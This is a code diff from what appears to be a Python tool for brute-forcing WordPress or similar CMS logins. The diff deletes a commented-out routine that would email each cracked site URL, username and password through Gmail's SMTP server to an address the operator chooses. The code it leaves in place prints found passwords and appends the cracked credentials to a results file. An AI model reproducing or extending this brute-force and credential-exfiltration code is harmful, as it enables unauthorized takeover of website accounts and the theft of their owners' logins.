@@ -202,34 +202,6 @@ def headersCMS(UA,lenbody,brutemode):
 def responseCMS(response):
     if response['set-cookie'].split(" ")[-1] == "httponly":
         return "1"
-#############################################################################
-#delete the comment to use Email function 
-
-# def email(urln,usr,pwd):
-#     gmail_user = "" #your gmail username
-#     gmail_pass = "" #yout gmail password
-
-#     emailFrom = gmail_user
-#     to = "" #send to  another email
-#     subject = "Found WP %s" %(urln)
-#     body = "URL : %s \nUsername : %s \npassword : %s" %(urln,usr,pwd)
-
-#     newmessage = '\r\n'.join([
-#         'To: %s' % to,
-#         'From: %s' % emailFrom,
-#         'Subject: %s' % subject,
-#         '',
-#         body
-#     ])
-
-#     try:
-#         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-#         server.ehlo()
-#         server.login(gmail_user, gmail_pass)
-#         server.sendmail(emailFrom, to, newmessage)
-#     except Exception, e:
-#         print e
-###################################################################################3
 
 def connection(url,user,password,UA,timeout,brutemode):
 
@@ -258,7 +230,6 @@ def connection(url,user,password,UA,timeout,brutemode):
               print('[!] Password FOUND!!!')
               print('')
               print('[!] Username: '+user+' Password: '+password)
-              #email(url, user, password) remove comment to use email function
               with open("result.txt","a") as text_file:
                   text_file.write("URL : "+url+"\nUsername : "+user+" Password : "+password+"\n")
               os._exit(0)
